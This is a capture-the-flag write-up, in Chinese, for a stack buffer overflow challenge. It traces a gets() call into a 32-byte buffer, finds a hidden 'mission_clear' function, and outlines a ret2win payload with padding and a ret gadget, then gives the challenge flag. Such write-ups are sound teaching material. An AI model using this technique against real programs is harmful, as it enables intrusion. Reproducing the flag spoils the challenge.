# Samus Stack Smash

## 題目描述

A Federation checkpoint AI loops the same authorization prompt while a damaged Chozo console hums behind it. Push past the guard and see what the access vault is hiding.

## 解題思路

### 第一步：分析 `main`

先用 GDB 看看 `chall` 的結構，從 `main` 開始 disassemble：

```text
0x000000000040136b <+38>:    call   0x4012d8 <vuln>
```

`main` 裡面沒有太重要的邏輯，主要就是呼叫 `vuln`，所以接著直接分析 `vuln`。

---

### 第二步：確認漏洞點

分析 `vuln` 後，可以看到程式開了一個 32-byte 的 buffer，但後面卻使用了 `gets()` 讀入資料：

```text
0x0000000000401316 <+62>:    lea    -0x20(%rbp),%rax
0x000000000040131a <+66>:    mov    %rax,%rdi
0x000000000040131d <+69>:    mov    $0x0,%eax
0x0000000000401322 <+74>:    call   0x4010f0 <gets@plt>
```

也就是說，這裡存在 stack buffer overflow。

同時，這題沒有 PIE，因此程式內部函式的位址是固定的，可以直接做 ret2win。

---

### 第三步：尋找 win function

確定可以 ret2win 之後，接下來要找可以拿 flag 的函式。

再看一次 `vuln`，可以看到裡面只有一些輸出相關的呼叫，沒有直接看到可疑的 win function：

```text
0x00000000004012ee <+22>:    call   0x4010b0 <puts@plt>
0x00000000004012f3 <+27>:    lea    0xd9e(%rip),%rax        # 0x402098
0x00000000004012fa <+34>:    mov    %rax,%rdi
0x00000000004012fd <+37>:    call   0x4010b0 <puts@plt>
0x0000000000401302 <+42>:    lea    0xdb7(%rip),%rax        # 0x4020c0
0x0000000000401309 <+49>:    mov    %rax,%rdi
0x000000000040130c <+52>:    mov    $0x0,%eax
0x0000000000401311 <+57>:    call   0x4010d0 <printf@plt>
0x0000000000401316 <+62>:    lea    -0x20(%rbp),%rax
0x000000000040131a <+66>:    mov    %rax,%rdi
0x000000000040131d <+69>:    mov    $0x0,%eax
0x0000000000401322 <+74>:    call   0x4010f0 <gets@plt>
0x0000000000401327 <+79>:    lea    -0x20(%rbp),%rax
0x000000000040132b <+83>:    mov    %rax,%rsi
0x000000000040132e <+86>:    lea    0xd8e(%rip),%rax        # 0x4020c3
0x0000000000401335 <+93>:    mov    %rax,%rdi
0x0000000000401338 <+96>:    mov    $0x0,%eax
0x000000000040133d <+101>:   call   0x4010d0 <printf@plt>
```

因此改用 `strings` 看一下題目給的 binary：

```text
...
vuln
mission_clear
...
```

可以發現有一個可疑函式叫做 `mission_clear`。

接著用 GDB 查看 `mission_clear`，發現它的起始位址是：

```text
0x401216
```

這就是這題要跳過去的目標函式。

---

### 第四步：構造 payload

`vuln` 裡面的 buffer 大小是 32 bytes，也就是 `0x20`。

stack layout 大概如下：

```text
buffer[32]
saved rbp[8]
return address[8]
```

所以要覆蓋 return address，需要先填滿：

```text
32 bytes buffer + 8 bytes saved rbp = 40 bytes
```

接著把 return address 改成 `mission_clear` 的位址即可。

payload 結構如下：

```text
"A" * 32
+ "B" * 8
+ ret gadget
+ mission_clear
```

其中 `ret gadget` 是為了處理 stack alignment，避免進入 `mission_clear` 後因為 stack 沒有對齊而出錯。

最後跳到 `mission_clear`，就可以成功取得 flag。

## Flag

```text
bitctf{{m37r01d_57ack_0v3rrun}}
```
